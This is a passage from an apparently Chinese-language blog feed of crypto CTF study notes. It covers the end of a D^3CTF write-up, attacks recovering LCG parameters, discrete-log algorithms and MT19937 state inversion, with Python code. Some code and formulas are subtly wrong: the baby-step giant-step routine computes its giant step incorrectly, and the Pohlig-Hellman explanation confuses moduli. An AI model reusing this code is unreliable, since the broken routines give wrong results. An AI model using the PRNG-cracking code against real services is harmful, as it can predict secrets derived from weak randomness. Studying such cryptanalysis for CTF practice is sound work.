class="number">1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957</span>, <span class="number">27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120</span>, <span class="number">27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224</span>, <span class="number">29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145</span>, <span class="number">33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823</span>, <span class="number">5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104</span>, <span class="number">61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964</span>, <span class="number">13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(C)):</span><br><span class="line">    m.append(BSGS(<span class="built_in">pow</span>(y,phi//e,n),<span class="built_in">pow</span>(C[i],phi//e,n),n))</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    flag = flag + m[<span class="built_in">len</span>(m)-<span class="number">1</span>-i]</span><br><span class="line">    flag *= e</span><br><span class="line">flag //= e</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h2 id="AliceWantFlag"><a href="#AliceWantFlag" class="headerlink" title="AliceWantFlag"></a>AliceWantFlag</h2><p>复现中，估计一周左右更新</p><h2 id="EasyCurve"><a href="#EasyCurve" class="headerlink" title="EasyCurve"></a>EasyCurve</h2><p>据说有非预期，学了佩尔方程然后回来更新</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Wp-for-AntCTF-X-D-3CTF-39-s-crypto&quot;&gt;&lt;a href=&quot;#Wp-for-AntCTF-X-D-3CTF-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Wp for AntCTF X D^3CTF&amp;#39;s crypto&quot;&gt;&lt;/a&gt;Wp for AntCTF X D^3CTF&amp;#39;s crypto&lt;/h1&gt;&lt;p&gt;我的格子和椭圆曲线实在是太烂了，奈何这次比赛基本都是（&lt;/p&gt;
&lt;p&gt;这次只贡献了1k分，我对不起V&amp;amp;N的师傅们呜呜呜&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>LCG</title>
    <link href="http://example.com/2021/03/04/LCG/"/>
    <id>http://example.com/2021/03/04/LCG/</id>
    <published>2021-03-04T01:33:32.000Z</published>
    <updated>2021-03-11T05:30:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h1><p>发现自己没有整过线性同余生成器的东西，今天专门来总解一下</p><span id="more"></span><p><a href="https://tailcall.net/blog/cracking-randomness-lcgs/">参考资料</a></p><h2 id="1、线性同余生成方法"><a href="#1、线性同余生成方法" class="headerlink" title="1、线性同余生成方法"></a>1、线性同余生成方法</h2><p>设A,B,M是一定常数，按照递推公式 $state_{i+1}&#x3D;(A\times state_i+B)\pmod{M}$ ，其中A称为乘数(multiplier)，B称为增量(increment)，M称为模数(modulus)</p><p>LCG的生成周期理论上应该是M，但大部分情况下会小于M，如果想要追求LCG的最大周期，应符合以下几个条件：</p><ul><li>A与B都是正整数</li><li>A、B、N[0]都比M要小</li><li>B与M互质</li><li>M的所有质因数都能整除A-1</li></ul><h2 id="2、攻击方法"><a href="#2、攻击方法" class="headerlink" title="2、攻击方法"></a>2、攻击方法</h2><p>我们把<code>state</code>均简称为<code>s</code></p><h3 id="1、B未知"><a href="#1、B未知" class="headerlink" title="1、B未知"></a>1、B未知</h3><p>只需获取中间的两个状态值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s_1 = (s_0*A+B)%M</span><br></pre></td></tr></table></figure><p>显然 $B &#x3D; s_1 - s_0\times a\pmod{M}$</p><h3 id="2、A与B未知"><a href="#2、A与B未知" class="headerlink" title="2、A与B未知"></a>2、A与B未知</h3><p>只需获取中间的三个状态值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s_1 = (s_0*A+B)%M</span><br><span class="line">s_2 = (s_1*A+B)%M</span><br></pre></td></tr></table></figure><p>线性方程，解起来还是挺简单的</p><p>显然 $A &#x3D; \frac{s_2-s_1}{s_1-s_0}\pmod{M}$ ，于是就转化成了问题1了</p><h3 id="3、A、B、M都不知道-一问三不知"><a href="#3、A、B、M都不知道-一问三不知" class="headerlink" title="3、A、B、M都不知道 一问三不知"></a>3、A、B、M都不知道 <del>一问三不知</del></h3><p>如果获取中间的7个状态值，就很有可能能够成功，数论里：如果有几个随机数分别乘以n，那么这几个数的欧几里德算法(gcd)就很可能等于n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">114514</span></span><br><span class="line"><span class="built_in">print</span>(reduce(gcd, [randint(<span class="number">1</span>, <span class="number">1000000</span>)*x, randint(<span class="number">1</span>, <span class="number">1000000</span>)*x, randint(<span class="number">1</span>, <span class="number">1000000</span>)*x, randint(<span class="number">1</span>, <span class="number">1000000</span>)*x]))</span><br><span class="line"><span class="comment"># 114514</span></span><br></pre></td></tr></table></figure><p>所以我们可以利用这个性质，来尝试得到M，于是问题就被转化成了问题2</p><h2 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">lcg_attack</span>:</span><br><span class="line">    <span class="comment"># unknown B (increment)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lcgattack1</span>(<span class="params">self, states, modulus, multiplier</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(states)&lt;<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;#####Invalid lenth of states! The lenth should be 2 at least!##### - Dawn_whisper&quot;</span>)</span><br><span class="line">        increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>] * multiplier) % modulus</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;multiplier&#x27;</span>:<span class="built_in">int</span>(multiplier), <span class="string">&#x27;increment&#x27;</span>:<span class="built_in">int</span>(increment), <span class="string">&#x27;modulus&#x27;</span>:<span class="built_in">int</span>(modulus)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unknown A (multiplier)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lcgattack2</span>(<span class="params">self, states, modulus</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(states)&lt;<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;#####Invalid lenth of states! The lenth should be 3 at least!##### - Dawn_whisper&quot;</span>)</span><br><span class="line">        multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * inverse(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">        <span class="keyword">return</span> self.lcgattack1(states, modulus, multiplier)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unknown M (modulus)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lcgattack3</span>(<span class="params">self, states</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(states)&lt;<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;#####Invalid lenth of states! The lenth should be 6 at least!##### - Dawn_whisper&quot;</span>)</span><br><span class="line">        diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">        zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">        modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">        <span class="keyword">return</span> self.lcgattack2(states, modulus)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;LCG&quot;&gt;&lt;a href=&quot;#LCG&quot; class=&quot;headerlink&quot; title=&quot;LCG&quot;&gt;&lt;/a&gt;LCG&lt;/h1&gt;&lt;p&gt;发现自己没有整过线性同余生成器的东西，今天专门来总解一下&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Discrete logarithm problem</title>
    <link href="http://example.com/2021/02/26/Discrete_logarithm_problem/"/>
    <id>http://example.com/2021/02/26/Discrete_logarithm_problem/</id>
    <published>2021-02-26T10:54:16.000Z</published>
    <updated>2021-03-11T01:17:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Discrete-logarithm-problem"><a href="#Discrete-logarithm-problem" class="headerlink" title="Discrete logarithm problem"></a>Discrete logarithm problem</h1><p>发现自己只是知道离散对数很难求，而且自己拿这玩意也没办法，专门来学一下<del>带老婆问题</del></p><span id="more"></span><h2 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h2><h3 id="生成元"><a href="#生成元" class="headerlink" title="生成元"></a>生成元</h3><p>​在一个群 G 中，如果 g 是 G 的生成元，即所有 G 中的所有元素都可以被表示成 $y &#x3D; g^x$ ，此时的 x 我们称为 y 在 G 中的对数</p><h3 id="阶"><a href="#阶" class="headerlink" title="阶"></a>阶</h3><p>​设 $m\geq 1$ ， $gcd(a,m)&#x3D;1$ ，使得 $a^d&#x3D;1\pmod{m}$ 成立的最小正整数 d 称为 a 对模 m 的指数或者阶，我们一般将其记为 $\delta_m(a)$</p><p>​另：满足 $a^d&#x3D;1\pmod{m}$ 的<code>d</code>一定满足 $d\mid\varphi(m)$</p><h3 id="原根"><a href="#原根" class="headerlink" title="原根"></a>原根</h3><p>​当 $\delta_m(a)&#x3D;\varphi(m)$ 时，称 a 是模 m 的原根，简称 m 的原根</p><p>​只有 $m&#x3D;2,4,p^\alpha,2p^\alpha （p为奇素数，\alpha为正整数）$ 时，模 m 的剩余系存在原根（充要条件）</p><h2 id="离散对数"><a href="#离散对数" class="headerlink" title="离散对数"></a>离散对数</h2><h3 id="暴力枚举"><a href="#暴力枚举" class="headerlink" title="暴力枚举"></a>暴力枚举</h3><p><del>万物皆可暴力</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ForceDLP</span>(<span class="params">A,B,P</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(P):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(A,i,P)==B:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(i)</span><br></pre></td></tr></table></figure><h3 id="Baby-step-giant-step"><a href="#Baby-step-giant-step" class="headerlink" title="Baby-step giant-step"></a>Baby-step giant-step</h3><p><del>又称北上广深算法 带老婆去了北上广深（bushi</del></p><p>已知 $y &#x3D; g^x$ ，我们不妨假设 $x&#x3D;i\cdot m+j$ ，$m &#x3D; \sqrt{x}$ ，这样 $m^2&gt;n$ ，则这时候一定在<code>[0,m]</code>内存在一组<code>(i,j)</code>满足 $x&#x3D;i\cdot m+j$</p><p>具体做法就是：因为 $y &#x3D; g^x&#x3D;g^{i\cdot m+j}$ ， 则 $y\cdot (g^{-m})^i&#x3D;g^j$ ，所以我们首先枚举所有的<code>j</code>并存在一个盒子里，接着枚举<code>i</code>，如果能找到相同的结果，这说明我们得到了<code>(i,j)</code></p><p>据说</p><ul><li>每一次 j 的增加表示 “baby-step”，一次乘上 $g$</li><li>每一次 i 的增加表示 “giant-step”，一次乘上 $g^{-m}$</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BSGS</span>(<span class="params">g, y, p</span>):</span><br><span class="line">    m = <span class="built_in">int</span>(sqrt(p))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_square(p):</span><br><span class="line">        m += <span class="number">1</span></span><br><span class="line">    S = &#123;<span class="built_in">pow</span>(g, j, p): j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m)&#125;</span><br><span class="line">    gs = <span class="built_in">pow</span>(g, inverse(m, p), p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">return</span> i * m + S[y]</span><br><span class="line">        y = y * gs % p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="Pohlig-Hellman-Algorithm"><a href="#Pohlig-Hellman-Algorithm" class="headerlink" title="Pohlig-Hellman Algorithm"></a>Pohlig-Hellman Algorithm</h3><p>​这种方法适用于当<code>p-1</code>是个光滑数，因为<code>p</code>是个质数，所以 $\varphi(p)&#x3D;p-1$ ，根据唯一分解定理，我们可以假设 $p-1 &#x3D;q_1^{e_1}\cdot q_2^{e_2}\cdot q_3^{e_3}\cdots q_n^{e_n}$ ，我们首先分解 $p-1$ 得到因子列表<code>listq</code>，接着计算每一个因子对应的 $g^{\frac{p-1}{q^e}}$ 与 $h^{\frac{p-1}{q^e}}$ ，此时我们就可以较轻松地计算出满足 $({g^{\frac{p-1}{q^e}}})^x&#x3D;h^{\frac{p-1}{q^e}}\pmod{p}$ 的<code>x&#39;</code>，而此时的<code>x&#39;</code>也满足 $x’ &#x3D;x\pmod{p^e}$ ，那么我们可以通过许多的因子来得到许多的<code>x&#39;</code>，最后通过CRT即可找到我们最终要求的<code>x</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># g^x = h (mod p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PohligHellmanDLP</span>(<span class="params">g,h,p</span>):</span><br><span class="line">    Lq=pollard_rho_Factor(p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> reduce(<span class="keyword">lambda</span> x,y: x*y, Lq) == p-<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(Lq)</span><br><span class="line">    Lg=[<span class="built_in">pow</span>(g,(p-<span class="number">1</span>)//i,p) <span class="keyword">for</span> i <span class="keyword">in</span> Lq]</span><br><span class="line">    Lh=[<span class="built_in">pow</span>(h,(p-<span class="number">1</span>)//i,p) <span class="keyword">for</span> i <span class="keyword">in</span> Lq]</span><br><span class="line">    length=<span class="built_in">len</span>(Lq)</span><br><span class="line">    La=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        La.append(ForceDLP(Lg[i],Lh[i],p))</span><br><span class="line">    X=CRT(Lq,La)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g,X,p)==h:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found x! x =&quot;</span>,X)</span><br><span class="line">        <span class="keyword">return</span> X</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">g=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">h=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">start_time=time.time()</span><br><span class="line">x = PohligHellmanDLP(g,h,p)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;it takes&quot;</span>,time.time()-start_time,<span class="string">&quot;seconds&quot;</span>,)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Discrete-logarithm-problem&quot;&gt;&lt;a href=&quot;#Discrete-logarithm-problem&quot; class=&quot;headerlink&quot; title=&quot;Discrete logarithm problem&quot;&gt;&lt;/a&gt;Discrete logarithm problem&lt;/h1&gt;&lt;p&gt;发现自己只是知道离散对数很难求，而且自己拿这玩意也没办法，专门来学一下&lt;del&gt;带老婆问题&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>MT19937</title>
    <link href="http://example.com/2021/02/03/MT19937/"/>
    <id>http://example.com/2021/02/03/MT19937/</id>
    <published>2021-02-03T13:08:43.000Z</published>
    <updated>2021-03-11T01:16:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="A-study-for-MT19937"><a href="#A-study-for-MT19937" class="headerlink" title="A study for MT19937"></a>A study for MT19937</h1><p>寒假前被一个伪随机数卡了，终于有时间来看看</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如前文，不会就得学（悲</p><p><a href="https://badmonkey.site/archives/mt19937.html">参考博客</a></p><h2 id="MT19937"><a href="#MT19937" class="headerlink" title="MT19937"></a>MT19937</h2><p>​MT19937是许多语言的默认伪随机数生成器，其优点为：周期非常长（达到 $2^{19937}-1$ ）、在 $1\leq k\leq 623$ 的维度之间都可以均等分布、速度较快。</p><p>​MT19937算法主要分为三个部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、基础的梅森旋转链</span><br><span class="line">2、输出处理算法（Tamper）</span><br><span class="line">3、旋转链的旋转算法（Twist）</span><br></pre></td></tr></table></figure><p>python中Random类采用MT19937算法，getrandbits(32)返回一个32位随机数，详细代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">0xFFFFFFFF</span> &amp; x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MT19937</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.mt = [<span class="number">0</span>] * <span class="number">624</span></span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">624</span>):</span><br><span class="line">            self.mt[i] = _int32(<span class="number">1812433253</span> * (self.mt[i - <span class="number">1</span>] ^ self.mt[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_number</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.mti == <span class="number">0</span>:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[self.mti]</span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">11</span></span><br><span class="line">        y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">        y = y ^ y &lt;&lt; <span class="number">15</span> &amp; <span class="number">4022730752</span></span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">18</span></span><br><span class="line">        self.mti = (self.mti + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line">        <span class="keyword">return</span> _int32(y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">624</span>):</span><br><span class="line">            y = _int32((self.mt[i] &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">            self.mt[i] = (y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i + <span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ <span class="number">0x9908b0df</span></span><br></pre></td></tr></table></figure><h2 id="针对题目"><a href="#针对题目" class="headerlink" title="针对题目"></a>针对题目</h2><h3 id="1-逆向extract-number"><a href="#1-逆向extract-number" class="headerlink" title="1.逆向extract_number"></a>1.逆向extract_number</h3><p>我们发现这其中有两种操作是较难的，我们先来看这一种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y = y ^ y &gt;&gt; <span class="number">11</span></span><br></pre></td></tr></table></figure><p>显而易见，这种操作并不会对<code>y</code>的高18位有任何影响，所以<code>y&#39;=y ^ y &gt;&gt; 11</code>的高18位就是<code>y</code>的高18位，而<code>y&#39;</code>接下来的18位正是<code>y</code>的高18位和<code>y</code>接下来的18位异或得来的，所以我们可以使用已知的高18位得到接下来的18位，同上，每操作一次我们就可得到<code>y</code>的18位，所以我们就能利用<code>y&#39;</code>通过有限的操作后复原之前的<code>y</code>，实现代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">y1 = </span><br><span class="line">y = y1^y1&gt;&gt;<span class="number">11</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>//<span class="number">11</span>):</span><br><span class="line">    y = y1^(y&gt;&gt;<span class="number">11</span>)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(y1)</span><br></pre></td></tr></table></figure><p>分析完这一种，我们来看下一种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br></pre></td></tr></table></figure><p>类比上一种，<code>y&#39;</code>的低7位实际上就是<code>y^2636928640</code>的结果，可以轻松的获得<code>y</code>的低7位，我们可以将<code>y&lt;&lt;7&amp;2636928640</code>当做一个整体（也就是说掩码其实并没有实质性的作用），这样模仿前一种操作，复原代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">y1 = </span><br><span class="line">y = y1^ y1 &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">tmp = y</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span> // <span class="number">7</span>):</span><br><span class="line">    y = tmp ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(y1)</span><br></pre></td></tr></table></figure><p>我们将左移和右移（带掩码与不带掩码）的复原代码整理如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">unBitShift</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">RightXor</span>(<span class="params">self,value,shift,bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &gt;&gt; shift</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">RightXorMasked</span>(<span class="params">self,value,shift,mask,bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">LeftXor</span>(<span class="params">self,value, shift,bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &lt;&lt; shift</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span 